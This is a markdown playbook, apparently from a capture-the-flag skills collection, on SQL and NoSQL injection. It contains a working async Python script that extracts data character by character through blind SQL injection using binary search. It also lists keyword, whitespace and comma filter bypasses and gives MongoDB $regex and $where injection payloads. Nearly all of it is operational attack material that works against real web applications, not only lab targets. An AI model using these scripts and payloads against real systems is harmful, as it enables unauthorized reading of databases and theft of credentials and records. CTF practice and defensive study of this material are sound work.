# SQL & NoSQL Injection Playbook (skills/web/sqli-injection.md)

## 1. High-Speed Blind SQLi via Binary Search

Extract characters in $\lceil \log_2(95) \rceil = 7$ HTTP requests per byte:

```python
import httpx
import asyncio

URL = "http://target.ctf/api/search"

async def check_condition(client: httpx.AsyncClient, condition: str) -> bool:
    payload = f"admin' AND ({condition})--"
    r = await client.get(URL, params={"username": payload})
    return "User exists" in r.text

async def extract_string(length=32):
    res = ""
    async with httpx.AsyncClient(timeout=5.0) as client:
        for idx in range(1, length + 1):
            low = 32
            high = 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ascii(substr((SELECT flag FROM flags LIMIT 1),{idx},1))>{mid}"
                if await check_condition(client, cond):
                    low = mid + 1
                else:
                    high = mid - 1
            res += chr(low)
            print(f"[+] Current flag: {res}")
    return res
```

---

## 2. Common Filter Bypasses in CTF

- **Whitespace blocked**: Use `/**/`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, or parenthesis `SELECT(flag)FROM(flags)`.
- **`OR` / `AND` blocked**: Use `||` / `&&` or `BETWEEN`.
- **`UNION` / `SELECT` blocked**: Use nested keywords `UNunionION`, inline comments `/*!50000SELECT*/`.
- **Comma blocked**: Use `MID(flag FROM 1 FOR 1)` or `JOIN`.

---

## 3. NoSQL Injection (MongoDB)
- Regex match: `{"username": "admin", "password": {"$regex": "^FLAG{a"}}`
- `$where` clause injection: `{"$where": "this.password.match(/^a/)"}`
